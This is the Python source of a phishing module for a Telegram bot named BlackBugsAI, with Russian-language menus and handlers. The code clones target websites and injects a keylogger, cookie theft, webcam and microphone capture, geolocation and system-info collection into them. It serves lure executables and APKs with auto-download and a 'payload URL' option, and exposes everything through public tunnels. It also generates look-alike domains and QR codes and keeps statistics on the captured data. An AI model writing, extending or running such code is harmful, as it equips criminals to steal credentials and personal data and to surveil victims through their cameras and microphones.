"""
bot_fish.py — Фишинг-модуль BlackBugsAI
"""
# AUTO-SPLIT from bot.py — do not edit manually, use bot.py as source of truth
import os, sys, re, json, time, random, threading, subprocess, shutil
import config
from telegram_client import (
    send_message, edit_message, answer_callback, send_document,
    delete_message, delete_webhook,
)
try:
    from agent_roles import get_role, has_perm, perm_error, get_user_limits
    ROLES_ENABLED = True
except ImportError:
    ROLES_ENABLED = False
    def get_role(cid): return 'user'
    def has_perm(cid, p): return True
    def perm_error(p, cid): return "🚫 Нет доступа"
from roles import norm_role, role_icon, role_label

from bot_ui import kb, btn, back_btn, menu_keyboard

def fish_menu_keyboard():
    """Главное меню фишинг-модуля."""
    if not FISH_ENABLED:
        return kb([btn("❌ Модуль недоступен", "noop")])

    active_info = fish_downloader.get_active_page_info()

    # ── Статусы всех тоннелей ──────────────────────────────────────
    def _alive(proc):
        return proc is not None and proc.poll() is None

    cf_str     = "🟢 CF"     if _alive(fish_bot_state.tunnel_process)  else "🔴 CF"
    bore_str   = "🟢 bore"   if _alive(fish_bot_state.bore_process)    else "🔴 bore"
    ngrok_str  = "🟢 ngrok"  if _alive(fish_bot_state.ngrok_process)   else "🔴 ngrok"
    serveo_str = "🟢 serveo" if _alive(fish_bot_state.serveo_process)  else "🔴 serveo"

    # ── Flask-сервер ───────────────────────────────────────────────
    srv_act  = "fish:server_stop"  if fish_bot_state.server_running else "fish:server_start"
    srv_str  = "🟢 сервер :{}".format(_fish_cfg.SERVER_PORT) if fish_bot_state.server_running \
               else "🔴 сервер :{}".format(_fish_cfg.SERVER_PORT)

    # Активная страница
    # get_active_page_info() → (page_id, url, type) или None
    if active_info is None:
        active_info = fish_downloader.get_active_page_info()
    if active_info:
        _ai_url = active_info[1] if len(active_info) > 1 else ''
        active_label = "🟢 стр: {}".format(str(_ai_url)[:22])
    else:
        active_label = "⚪ стр не выбрана"

    return kb(
        # ── Заголовок ─────────────────────────────────────────────
        [btn("═══ 🎣 ФИШИНГ ═══",        "noop")],
        # ── Загрузка страниц ──────────────────────────────────────
        [btn("📥 URL-страница",           "fish:load"),
         btn("🌐 Весь сайт",              "fish:fullsite")],
        [btn("📍 +Гео",                   "fish:load_geo"),
         btn("📸 +Камера",                "fish:load_cam"),
         btn("🎤 +Микро",                 "fish:load_mic")],
        # ── Файлы и страница скачивания ───────────────────────────
        [btn("═══ 📁 ФАЙЛЫ ═══",          "noop")],
        [btn("📤 Загрузить файл",         "fish:upload"),
         btn("📂 Мои файлы",              "fish:files")],
        [btn("🌐 Загрузить HTML",         "fish:upload_html"),
         btn("📄 Создать стр. скачивания","fish:create_dl")],
        [btn("💣 Payload URL",            "fish:payload")],
        # ── Данные ────────────────────────────────────────────────
        [btn("═══ 📊 ДАННЫЕ ═══",         "noop")],
        [btn("📚 Страницы",               "fish:pages"),
         btn("📊 Статистика",             "fish:stats")],
        [btn("📸 Фото с вебки",           "fish:photos"),
         btn("🎵 Аудио записи",           "fish:audios")],
        [btn("🗺 Карта гео",              "fish:map"),
         btn("📤 Экспорт CSV",            "fish:export")],
        # ── Сервер ────────────────────────────────────────────────
        [btn("═══ 🌐 СЕРВЕР ═══",         "noop")],
        [btn(srv_str,                      srv_act),
         btn("🔄 Рестарт",                "fish:server_restart")],
        [btn(active_label,                 "fish:pages")],
        # ── Тоннели ───────────────────────────────────────────────
        [btn("═══ 🕳 ТОННЕЛИ ═══",        "noop")],
        [btn("{} {}".format(
                 "☁️" if (shutil.which("cloudflared") and not _is_termux()) else "🕳",
                 cf_str),                  "fish:tunnel"),
         btn("🛑",                         "fish:stop_tunnel"),
         btn("🕳 {}".format(bore_str),     "fish:bore_start"),
         btn("🛑",                         "fish:bore_stop")],
        [btn("🔌 {}".format(ngrok_str),    "fish:ngrok_start"),
         btn("🛑",                         "fish:ngrok_stop"),
         btn("🔑 {}".format(serveo_str),   "fish:serveo_start"),
         btn("🛑",                         "fish:serveo_stop")],
        # ── Утилиты ───────────────────────────────────────────────
        [btn("═══ 🛠 УТИЛИТЫ ═══",        "noop")],
        [btn("🔀 Похожий домен",           "fish:gen_domain"),
         btn("📱 QR-код",                  "fish:qr")],
        [btn("🧹 Очистить логи",           "fish:clear_logs"),
         btn("ℹ️ Статус",                 "fish:status")],
        [back_btn()],
    )


def _is_termux():
    """
    Определяем Android/Termux-окружение.

    На Android без root Go-бинарники (cloudflared) читают /etc/resolv.conf
    который указывает на [::1]:53 — внутренний DNS-демон Android.
    Этот демон недоступен снаружи официальных приложений, поэтому
    Go-резолвер всегда получает "connection refused".

    Python при этом использует Android libc через socket.getaddrinfo —
    и у него DNS работает нормально. Именно поэтому _dns_resolves()
    даёт ложноположительный результат: Python видит DNS, Go — нет.

    Признак Termux — каталог /data/data/com.termux или PREFIX в окружении.
    """
    if os.path.isdir("/data/data/com.termux"):
        return True
    prefix = os.environ.get("PREFIX", "")
    if "com.termux" in prefix:
        return True
    return False


def _is_windows():
    """Определяем Windows-окружение."""
    import sys as _sys
    return _sys.platform == 'win32'


def _windows_install_cloudflared():
    """
    Скачивает cloudflared.exe для Windows и кладёт рядом со скриптом.
    Вызывается автоматически если cloudflared не найден в PATH.
    """
    import urllib.request, os, sys, stat
    script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    dest = os.path.join(script_dir, 'cloudflared.exe')

    # Если уже есть рядом со скриптом — добавляем папку в PATH
    if os.path.isfile(dest):
        os.environ['PATH'] = script_dir + os.pathsep + os.environ.get('PATH', '')
        print("cloudflared: найден в {}".format(dest), flush=True)
        return

    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    print("cloudflared: скачиваю {} → {}".format(url, dest), flush=True)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=60) as resp, open(dest, 'wb') as f:
            total = int(resp.headers.get('Content-Length', 0))
            downloaded = 0
            while True:
                chunk = resp.read(65536)
                if not chunk:
                    break
                f.write(chunk)
                downloaded += len(chunk)
                if total:
                    pct = downloaded * 100 // total
                    print(f"cloudflared: {pct}%", end="\r", flush=True)
        print("cloudflared: ✅ скачан ({:.1f} MB)".format(downloaded / 1024 / 1024), flush=True)
        # Добавляем папку в PATH текущего процесса
        os.environ['PATH'] = script_dir + os.pathsep + os.environ.get('PATH', '')
    except Exception as e:
        print("cloudflared: ❌ не удалось скачать — {}".format(e), flush=True)


def _pip_flags():
    """Флаги pip — --break-system-packages только для Termux."""
    return ['--break-system-packages'] if _is_termux() else []


def _disk_free_mb(path=None):
    """Свободное место на диске в MB — работает на всех ОС."""
    import shutil as _sh
    try:
        usage = _sh.disk_usage(path or os.path.expanduser('~'))
        return usage.free // 1024 // 1024
    except Exception:
        return None


def _ram_info_mb():
    """Возвращает (total_mb, available_mb) или None."""
    try:
        import psutil
        mem = psutil.virtual_memory()
        return mem.total // 1024 // 1024, mem.available // 1024 // 1024
    except Exception:
        pass
    try:
        total, avail = None, None
        with open('/proc/meminfo') as f:
            for line in f:
                if line.startswith('MemTotal:'):
                    total = int(line.split()[1]) // 1024
                elif line.startswith('MemAvailable:'):
                    avail = int(line.split()[1]) // 1024
                if total and avail:
                    break
        return total, avail
    except Exception:
        return None


def _dns_resolves(hostname, timeout=3):
    """
    Быстрая проверка: резолвится ли hostname через системный DNS.
    Использует socket.getaddrinfo — тот же путь что и большинство
    нативных бинарников (включая Go при GODEBUG=netdns=cgo).
    Возвращает True если хотя бы один IP найден за timeout секунд.
    """
    import socket
    import concurrent.futures
    def _resolve():
        return socket.getaddrinfo(hostname, None)
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            fut = ex.submit(_resolve)
            fut.result(timeout=timeout)
        return True
    except Exception:
        return False


def _fix_tunnel_dns():
    """
    Пытается прописать IP Cloudflare в /etc/hosts чтобы Go-резолвер
    нашёл домен без DNS-запроса (при GODEBUG=netdns=go).

    На Android без root /etc/hosts — read-only. Поэтому пробуем
    несколько путей, в том числе хардкодированный путь Termux
    (не полагаемся на $PREFIX — он может быть не установлен
    когда бот запущен не из интерактивного терминала).

    Возвращает True если запись удалась хотя бы в один файл.
    """
    cf_entries = [
        "104.16.230.132 api.trycloudflare.com",
        "104.16.231.132 api.trycloudflare.com",
    ]
    candidates = [
        # Termux — хардкод, не полагаемся на $PREFIX
        "/data/data/com.termux/files/usr/etc/hosts",
        # Termux через $PREFIX на случай нестандартной установки
        os.path.join(os.environ.get("PREFIX", "/nonexistent"), "etc", "hosts"),
        # Системный — обычно read-only, но вдруг root
        "/etc/hosts",
    ]
    # Убираем дубликаты (если $PREFIX не установлен, первые два совпадут)
    seen, unique = set(), []
    for p in candidates:
        if p not in seen:
            seen.add(p)
            unique.append(p)

    for hosts_path in unique:
        if not os.path.exists(os.path.dirname(hosts_path)):
            continue
        try:
            try:
                with open(hosts_path, "r") as f:
                    existing = f.read()
            except Exception:
                existing = ""
            additions = [e for e in cf_entries if e.split()[1] not in existing]
            if not additions:
                print("DNS fix: {} уже содержит нужные записи".format(hosts_path), flush=True)
                return True
            with open(hosts_path, "a") as f:
                f.write("\n# cloudflared DNS fix (auto)\n")
                f.write("\n".join(additions) + "\n")
            print("DNS fix: OK — записано в {}".format(hosts_path), flush=True)
            return True
        except Exception as e:
            print("DNS fix: {} — {}".format(hosts_path, e), flush=True)

    print("DNS fix: не удалось записать ни в один hosts-файл", flush=True)
    return False


def _fish_start_cloudflared():
    """
    Запускает тоннель и возвращает публичный URL или None.

    Порядок попыток:
      1. cloudflared — сначала делаем pre-flight DNS check через socket.
         Если DNS работает системно — запускаем. Если нет — пробуем
         hosts-фикс. Если и он недоступен (read-only Android) — пропускаем
         cloudflared совсем, без ожидания таймаута.
      2. bore — Rust/системный резолвер, не зависит от Go DNS quirks.
      3. SSH → serveo.net.
    """
    port = _fish_cfg.SERVER_PORT
    cf_host = "api.trycloudflare.com"

    # ── 1. cloudflared ────────────────────────────────────────────────
    # На Android/Termux Go-бинарники используют собственный DNS-стек
    # который читает /etc/resolv.conf → [::1]:53 (недоступно без root).
    # Python при этом нормально резолвит через libc — поэтому проверка
    # через socket даёт ложноположительный результат. Детектируем Termux
    # и пропускаем cloudflared полностью, без попыток.
    # На Windows — автоматически скачиваем cloudflared если его нет
    if not shutil.which("cloudflared") and _is_windows():
        _windows_install_cloudflared()

    if shutil.which("cloudflared"):
        if _is_termux():
            print("cloudflared: пропущен (Android/Termux — Go-DNS недоступен без root)", flush=True)
        else:
            # Не Android — пробуем hosts-фикс на всякий случай, потом запускаем
            _fix_tunnel_dns()
            env = os.environ.copy()
            env["GODEBUG"] = "netdns=go"
            try:
                proc = subprocess.Popen(
                    ["cloudflared", "tunnel",
                     "--edge-ip-version", "4",
                     "--url", "http://localhost:{}".format(port)],
                    stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                    text=True, bufsize=1, env=env,
                )
                fish_bot_state.tunnel_process = proc
                url_pat = r"https://[a-zA-Z0-9-]+\.trycloudflare\.com"
                for line in proc.stderr:
                    print("cloudflared:", line.rstrip(), flush=True)
                    m = re.search(url_pat, line)
                    if m:
                        fish_bot_state.tunnel_url = m.group(0)
                        return fish_bot_state.tunnel_url
                    if "connection refused" in line and ":53" in line:
                        print("cloudflared: DNS недоступен, переходим к bore", flush=True)
                        proc.terminate()
                        break
            except Exception as e:
                print("cloudflared error: {}".format(e), flush=True)

    # ── 2. bore ───────────────────────────────────────────────────────
    if shutil.which("bore"):
        try:
            proc = subprocess.Popen(
                ["bore", "local", str(port), "--to", "bore.pub"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
            fish_bot_state.tunnel_process = proc
            # bore печатает: "listening at bore.pub:XXXXX"
            port_pat = r"bore\.pub:(\d+)"
            for line in proc.stdout:
                print("bore:", line.rstrip(), flush=True)
                m = re.search(port_pat, line)
                if m:
                    url = "http://bore.pub:{}".format(m.group(1))
                    fish_bot_state.tunnel_url = url
                    return url
        except Exception as e:
            print("bore error: {}".format(e), flush=True)

    # ── 3. SSH → serveo.net с авто-реконнектом ───────────────────────
    if shutil.which("ssh"):
        url_pat_s = r"https://[a-zA-Z0-9-]+\.serveo\.net"
        # Первый коннект — ловим URL
        for _attempt in range(3):
            try:
                proc = subprocess.Popen(
                    ["ssh",
                     "-o", "StrictHostKeyChecking=no",
                     "-o", "ServerAliveInterval=15",
                     "-o", "ServerAliveCountMax=3",
                     "-o", "ExitOnForwardFailure=yes",
                     "-R", "80:localhost:{}".format(port),
                     "serveo.net"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1,
                )
                fish_bot_state.tunnel_process = proc
                tunnel_found = None
                for line in proc.stdout:
                    print("serveo:", line.rstrip(), flush=True)
                    ms = re.search(url_pat_s, line)
                    if ms:
                        tunnel_found = ms.group(0)
                        fish_bot_state.tunnel_url = tunnel_found
                        break
                if tunnel_found:
                    # Запускаем watchdog для авто-реконнекта в фоне
                    def _serveo_watchdog(_port=port, _pat=url_pat_s):
                        import time as _t
                        while True:
                            _t.sleep(5)
                            # Проверяем жив ли процесс
                            if fish_bot_state.tunnel_process is None:
                                break
                            ret = fish_bot_state.tunnel_process.poll()
                            if ret is not None:
                                print("serveo: упал ({}), перезапускаю...".format(ret), flush=True)
                                fish_bot_state.tunnel_url = None
                                _p2 = subprocess.Popen(
                                    ["ssh",
                                     "-o", "StrictHostKeyChecking=no",
                                     "-o", "ServerAliveInterval=15",
                                     "-o", "ServerAliveCountMax=3",
                                     "-o", "ExitOnForwardFailure=yes",
                                     "-R", "80:localhost:{}".format(_port),
                                     "serveo.net"],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1,
                                )
                                fish_bot_state.tunnel_process = _p2
                                for _line in _p2.stdout:
                                    print("serveo:", _line.rstrip(), flush=True)
                                    _ms = re.search(_pat, _line)
                                    if _ms:
                                        fish_bot_state.tunnel_url = _ms.group(0)
                                        break
                    import threading as _thr
                    _thr.Thread(target=_serveo_watchdog, daemon=True, name="serveo-watchdog").start()
                    return tunnel_found
            except Exception as e:
                print("serveo error (attempt {}): {}".format(_attempt+1, e), flush=True)
                import time as _ts; _ts.sleep(3)

    # Всё провалилось
    return None


def _fish_stop_tunnel():
    if fish_bot_state.tunnel_process:
        fish_bot_state.tunnel_process.terminate()
        fish_bot_state.tunnel_process = None
        fish_bot_state.tunnel_url = None

def _fish_show_options(chat_id, msg_id=None):
    """Показывает меню настроек инжекций с кнопками-переключателями."""
    opts = _fish_user_opts.get(chat_id, {})
    # Убедимся, что все ключи есть
    default_opts = {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    }
    for k, v in default_opts.items():
        opts.setdefault(k, v)

    def _btn(label, toggle):
        status = "✅" if opts.get(toggle, False) else "❌"
        return btn(f"{label} {status}", f"fish_opt:{toggle}")

    # Кнопки переключения опций
    rows = [
        [_btn("📍 Гео", "geo"), _btn("📸 Камера", "cam")],
        [_btn("🎤 Микрофон", "mic"), _btn("📥 Авто", "auto")],
        [_btn("⌨️ Кейлоггер", "keylogger"), _btn("🍪 Куки", "cookies")],
        [_btn("🖥️ Инфо", "sysinfo"), _btn("🔄 Iframe", "iframe")],
    ]
    # Предустановленные шаблоны
    rows.append([
        btn("📍 Только гео", "fish_preset:geo"),
        btn("📸 Только камера", "fish_preset:cam"),
    ])
    rows.append([
        btn("🎤 Только микрофон", "fish_preset:mic"),
        btn("📦 Всё", "fish_preset:all"),
    ])
    # Действия
    rows.append([
        btn("🚀 Создать страницу", "fish_opt:generate"),
        btn("❌ Отмена", "menu_fish"),
    ])

    text = (
        "🔧 <b>Настройки инжекций</b>\n\n"
        "Нажимай на опции, чтобы включить/выключить.\n"
        "Можно использовать готовые шаблоны."
    )
    if msg_id:
        edit_message(chat_id, msg_id, text, reply_markup=kb(*rows))
    else:
        send_message(text, chat_id, reply_markup=kb(*rows))


def _fish_send_options(chat_id):
    """Красивое меню настроек инжекций + предпросмотр URL страницы скачивания."""
    opts = _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    fid_data = _fish_user_data.get(chat_id, {})
    fid      = fid_data.get('file_id')
    files    = fish_db.get_all_files() if fid else []
    fi       = next((f for f in files if f['id'] == fid), None)
    fname    = fi['original_name'] if fi else '???'

    def _t(v): return "🟢" if v else "⚪"
    def _ob(label, key): return btn("{} {}".format(_t(opts.get(key, False)), label), "fish_opt:{}".format(key))

    # Считаем сколько инжекций включено
    active = sum(1 for k in ('geo','cam','mic','keylogger','steal_cookies','system_info','iframe_phish')
                 if opts.get(k))
    auto_dl = "🟢 авто-скачивание" if opts.get('auto') else "⚪ ручное"

    # Предпросмотр URL если сервер запущен
    preview_url = ""
    if fish_bot_state.server_running and fid:
        base = fish_bot_state.tunnel_url or "http://localhost:{}".format(_fish_cfg.SERVER_PORT)
        preview_url = "\n🔗 <code>{}/download/{}</code>".format(base, fid)

    send_message(
        "📄 <b>Страница скачивания</b>\n"
        "Файл: <b>{}</b>\n"
        "Инжекций активно: <b>{}</b>  |  {}{}\n\n"
        "<i>Переключай что нужно, затем жми 🚀 Создать</i>".format(
            fname, active, auto_dl, preview_url),
        chat_id,
        reply_markup=kb(
            [btn("═══ 📍 СЛЕЖКА ═══",    "noop")],
            [_ob("Геолокация",  "geo"),    _ob("Камера",   "cam")],
            [_ob("Микрофон",    "mic"),    _ob("Кейлоггер","keylogger")],
            [btn("═══ 🍪 ДАННЫЕ ═══",    "noop")],
            [_ob("Куки",        "cookies"), _ob("Инфо системы","sysinfo")],
            [_ob("Iframe фишинг","iframe"), _ob("Авто-скачивание","auto")],
            [btn("═══ ─────────── ═══",  "noop")],
            [btn("🚀 Создать страницу",  "fish_opt:generate"),
             btn("👁 Предпросмотр",      "fish:status")],
            [btn("❌ Отмена",             "menu_fish")],
        )
    )


def _fish_send_options_html(chat_id):
    """Меню инжекций для загруженного HTML-файла (не скачанного с URL)."""
    data = _fish_user_data.get(chat_id, {})
    fname = data.get('html_filename', 'файл.html')
    opts = _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })

    def _t(v): return "🟢" if v else "⚪"
    def _ob(label, key): return btn("{} {}".format(_t(opts.get(key, False)), label),
                                    "fish_opt_html:{}".format(key))

    active = sum(1 for k in ('geo','cam','mic','keylogger','steal_cookies','system_info')
                 if opts.get(k))

    send_message(
        "🌐 <b>HTML: {}</b>\n"
        "Инжекций: <b>{}</b>\n\n"
        "<i>Включи нужные модули → 🚀 Создать</i>".format(fname, active),
        chat_id,
        reply_markup=kb(
            [btn("═══ 📍 СЛЕЖКА ═══",       "noop")],
            [_ob("Геолокация",  "geo"),       _ob("Камера",      "cam")],
            [_ob("Микрофон",    "mic"),        _ob("Кейлоггер",   "keylogger")],
            [btn("═══ 🍪 ДАННЫЕ ═══",         "noop")],
            [_ob("Куки",        "cookies"),    _ob("Инфо системы","sysinfo")],
            [btn("═══ ─────────── ═══",       "noop")],
            [btn("🚀 Создать страницу",       "fish_opt_html:generate"),
             btn("❌ Отмена",                 "menu_fish")],
        )
    )


def _fish_handle_opt_html(toggle, chat_id):
    """Обрабатывает fish_opt_html: — те же опции что и для DL-страницы."""
    opts = _fish_user_opts.setdefault(chat_id, {
        'geo': False, 'cam': False, 'mic': False, 'auto': False,
        'keylogger': False, 'steal_cookies': False, 'system_info': False,
        'iframe_phish': False, 'iframe_url': None,
    })
    data = _fish_user_data.get(chat_id, {})

    simple_toggles = {
        'geo': 'geo', 'cam': 'cam', 'mic': 'mic', 'auto': 'auto',
        'keylogger': 'keylogger', 'cookies': 'steal_cookies',
        'sysinfo': 'system_info',
    }
    if toggle in simple_toggles:
        k = simple_toggles[toggle]
        opts[k] = not opts.get(k, False)
        _fish_send_options_html(chat_id)
        return

    if toggle == 'generate':
        html = data.get('html_content')
        fname = data.get('html_filename', 'page.html')
        if not html:
            send_message("❌ HTML не найден. Загрузи файл снова.", chat_id,
                         reply_markup=kb([btn("🌐 Загрузить HTML", "fish:upload_html"),
                                          back_btn("menu_fish")]))
            return

        # Применяем инжекции
        injected = fish_utils.inject_scripts(
            html,
            geo=opts.get('geo', False),
            media=opts.get('cam', False) or opts.get('mic', False),
            capture_photo=opts.get('cam', False),
            capture_audio=opts.get('mic', False),
            download_file_id=None,
            auto_download=False,
            keylogger=opts.get('keylogger', False),
            steal_cookies=opts.get('steal_cookies', False),
            system_info=opts.get('system_info', False),
            iframe_phish=False,
            iframe_url=None,
        )

        # Сохраняем страницу
        source_label = "html_upload_{}".format(fname.replace('.html','').replace('.htm',''))
        pid = fish_downloader.save_page(injected, source_label, 'uploaded_html')
        fish_downloader.set_active_page(pid)

        _fish_user_data.pop(chat_id, None)
        _fish_user_opts.pop(chat_id, None)

        base_url = (fish_bot_state.tunnel_url or
                    ("http://localhost:{}".format(_fish_cfg.SERVER_PORT)
                     if fish_bot_state.server_running else None))
        url_line = "\n🔗 <code>{}/</code>".format(base_url) if base_url else ""

        active_inj = sum(1 for k in ('geo','cam','mic','keylogger','steal_cookies','system_info')
                         if opts.get(k))

        send_message(
            "✅ <b>HTML-страница создана!</b>\n"
            "Файл: <b>{}</b>\n"
            "ID: <code>{}</code>  |  Инжекций: <b>{}</b>{}\n\n"
            "<i>Страница активирована и готова.</i>".format(
                fname, pid, active_inj, url_line),
            chat_id,
            reply_markup=kb(
                [btn("📱 QR-код", "fish:qr"),
                 btn("📊 Статистика", "fish:stats")],
                [btn("🌐 Загрузить ещё", "fish:upload_html"),
                 back_btn("menu_fish")],
            ))


def _fish_handle_action(action, chat_id):
    """Обрабатывает fish: callback actions."""
    if not FISH_ENABLED:
        send_message("❌ Фишинг-модуль не загружен. Проверь зависимости.", chat_id)
        return

    if action == 'load':
        _wait_state[chat_id] = 'fish_load_url'
        send_message("📥 Введи URL страницы (например https://vk.com):",
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'fullsite':
        _wait_state[chat_id] = 'fish_fullsite_url'
        send_message("🌐 Введи URL сайта для полного скачивания:",
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action in ('load_geo', 'load_cam', 'load_mic'):
        mode = {'load_geo': 'geo', 'load_cam': 'cam', 'load_mic': 'mic'}[action]
        _wait_state[chat_id] = 'fish_load_{}_url'.format(mode)
        send_message("📥 Введи URL страницы (+{} инжекция):".format(mode),
                     chat_id, reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'upload_html':
        _wait_state[chat_id] = 'fish_upload_html'
        send_message(
            "🌐 <b>Загрузить HTML-страницу</b>\n\n"
            "Отправь <b>.html</b> файл — он станет фишинговой страницей.\n\n"
            "Что будет дальше:\n"
            "• Файл прочитается как HTML\n"
            "• Ты выберешь инжекции (гео/камера/кейлоггер...)\n"
            "• Страница активируется на сервере\n\n"
            "<i>💡 Совет: можно загружать клоны с любых сайтов</i>",
            chat_id,
            reply_markup=kb(
                [btn("❌ Отмена", "menu_fish")],
            ))

    elif action == 'upload':
        _wait_state[chat_id] = 'fish_upload_file'
        send_message(
            "📤 <b>Загрузить файл-приманку</b>\n\n"
            "Отправь файл прямо сюда. Telegram ограничивает — до <b>20 MB</b>.\n\n"
            "<b>Популярные форматы:</b>\n"
            "• APK / IPA — мобильные приложения\n"
            "• EXE / MSI — установщики Windows\n"
            "• PDF / DOCX — документы\n"
            "• ZIP / RAR — архивы\n"
            "• MP4 / MOV — видео\n\n"
            "<i>После загрузки файл появится в «Мои файлы» и станет доступен "
            "для страницы скачивания.</i>",
            chat_id,
            reply_markup=kb(
                [btn("📂 Мои файлы", "fish:files")],
                [btn("❌ Отмена",     "menu_fish")],
            ))

    elif action == 'files':
        files = fish_db.get_all_files()
        if not files:
            send_message(
                "📭 <b>Файлов нет</b>\n\nЗагрузи первый файл — нажми кнопку ниже.",
                chat_id,
                reply_markup=kb(
                    [btn("📤 Загрузить файл", "fish:upload")],
                    [back_btn("menu_fish")],
                ))
            return
        total_size = sum(f['size'] for f in files) / 1024
        lines = ["📂 <b>Файлы-приманки</b> ({} шт., {:.0f} KB)\n".format(len(files), total_size)]
        for f in files:
            fid, name, size, dls = f['id'], f['original_name'], f['size'], f['downloads']
            ext = name.rsplit('.', 1)[-1].upper() if '.' in name else '???'
            icon = {'APK': '📱', 'EXE': '💻', 'MSI': '💻', 'PDF': '📕',
                    'ZIP': '🗜', 'RAR': '🗜', 'MP4': '🎬', 'MOV': '🎬',
                    'DOCX': '📄', 'DOC': '📄'}.get(ext, '📁')
            lines.append(
                "{} <b>{}</b>\n"
                "   ID: <code>{}</code>  |  {:.0f} KB  |  ⬇️ {} загрузок".format(
                    icon, name, fid, size / 1024, dls))
        # Кнопка на каждый файл: [📄 DL-стр | 🗑 Удалить]
        rows = []
        for f in files:
            rows.append([
                btn("📄 DL-стр → {}".format(f['original_name'][:18]),
                    "fish_selfile:{}".format(f['id'])),
                btn("🗑 #{}".format(f['id']),
                    "fish:del_file:{}".format(f['id'])),
            ])
        rows.append([btn("📤 Загрузить ещё", "fish:upload"), back_btn("menu_fish")])
        send_message("\n".join(lines), chat_id, reply_markup=kb(*rows))

    elif action == 'create_dl':
        files = fish_db.get_all_files()
        if not files:
            send_message(
                "❌ <b>Нет файлов</b>\n\n"
                "Сначала загрузи файл-приманку — жми кнопку ниже.\n"
                "<i>Например: APK, EXE, PDF, ZIP...</i>",
                chat_id,
                reply_markup=kb(
                    [btn("📤 Загрузить файл", "fish:upload")],
                    [back_btn("menu_fish")],
                ))
            return
        lines = ["📄 <b>Страница скачивания</b>\n\nВыбери файл-приманку:\n"]
        rows = []
        for f in files:
            ext = f['original_name'].rsplit('.', 1)[-1].upper() if '.' in f['original_name'] else '?'
            icon = {'APK': '📱', 'EXE': '💻', 'PDF': '📕', 'ZIP': '🗜',
                    'RAR': '🗜', 'MP4': '🎬', 'DOCX': '📄'}.get(ext, '📁')
            label = "{} {} — {:.0f} KB | ⬇️{}".format(
                icon, f['original_name'], f['size']/1024, f['downloads'])
            rows.append([btn(label, "fish_selfile:{}".format(f['id']))])
        rows.append([btn("📤 Загрузить ещё", "fish:upload"), back_btn("menu_fish")])
        send_message("".join(lines), chat_id, reply_markup=kb(*rows))

    elif action.startswith('del_file:'):
        # Удаление файла
        fid_str = action.split(':', 1)[1]
        try:
            fid = int(fid_str)
            files = fish_db.get_all_files()
            fi = next((f for f in files if f['id'] == fid), None)
            if fi:
                fish_db.delete_file(fid)
                send_message(
                    "🗑 Файл <b>{}</b> удалён.".format(fi['original_name']),
                    chat_id,
                    reply_markup=kb([btn("📂 Мои файлы", "fish:files"), back_btn("menu_fish")]))
            else:
                send_message("❌ Файл не найден.", chat_id,
                             reply_markup=kb([back_btn("menu_fish")]))
        except Exception as e:
            send_message("❌ Ошибка удаления: {}".format(e), chat_id)

    elif action == 'payload':
        _wait_state[chat_id] = 'fish_payload_url'
        send_message("💣 Введи URL вредоносного файла:", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'pages':
        pages = fish_downloader.get_all_pages()
        if not pages:
            send_message("📭 Нет сохранённых страниц.", chat_id,
                         reply_markup=kb([back_btn("menu_fish")]))
            return
        lines = ["📚 <b>Страницы</b> (последние 10):\n"]
        for pid, meta in sorted(pages.items(), key=lambda x: x[0], reverse=True)[:10]:
            ptype = "🌐" if meta.get('type') == 'full_site' else "📄"
            lines.append("{} <code>{}</code> — {}".format(
                ptype, pid, meta['url'][:45]))
        rows = [[btn("✅ Активировать ID", "fish:use_page"),
                 btn("♻️ Клонировать ID",  "fish:clone_page")]]
        rows.append([back_btn("menu_fish")])
        send_message("\n".join(lines), chat_id, reply_markup=kb(*rows))

    elif action == 'use_page':
        _wait_state[chat_id] = 'fish_use_page'
        send_message("✅ Введи ID страницы для активации:", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'clone_page':
        _wait_state[chat_id] = 'fish_clone_page'
        send_message("♻️ Введи ID страницы для клонирования:", chat_id,
                     reply_markup=kb([btn("❌ Отмена", "menu_fish")]))

    elif action == 'fish_stats':
        try:
            cc, gc, wc, mc, vc = fish_db.get_stats()
            send_message(
                "📊 <b>Фишинг-статистика</b>\n\n"
                "🔑 Данных: {}\n📍 Геолокаций: {}\n"
                "📸 Фото: {}\n🎤 Аудио: {}\n👁 Визитов: {}".format(
                    cc, gc, wc, mc, vc),
                chat_id, reply_markup=kb([back_btn("menu_fish")]))
        except Exception as e:
            send_message("❌ Ошибка: {}".format(e), chat_id)

    elif action == 'tunnel':
        def _do_tunnel():
            # На Windows — автоскачиваем cloudflared если нет
            if _is_windows() and not shutil.which("cloudflared"):
                send_message("⬇️ cloudflared не найден, скачиваю...", chat_id)
                _windows_install_cloudflared()
                if not shutil.which("cloudflared"):
                    send_message(
                        "❌ Не удалось скачать cloudflared автоматически.\n\n"
                        "Скачай вручную:\n"
                        "<code>https://github.com/cloudflare/cloudflared/releases/latest/"
                        "download/cloudflared-windows-amd64.exe</code>\n\n"
                        "Положи <b>cloudflared.exe</b> рядом с bot.py и перезапусти.",
                        chat_id, reply_markup=kb([back_btn("menu_fish")]))
                    return
            # Определяем что реально доступно и пишем правильное сообщение
            has_cf   = shutil.which("cloudflared") and not _is_termux()
            has_bore = shutil.which("bore")
            has_ssh  = shutil.which("ssh")
            if has_cf:
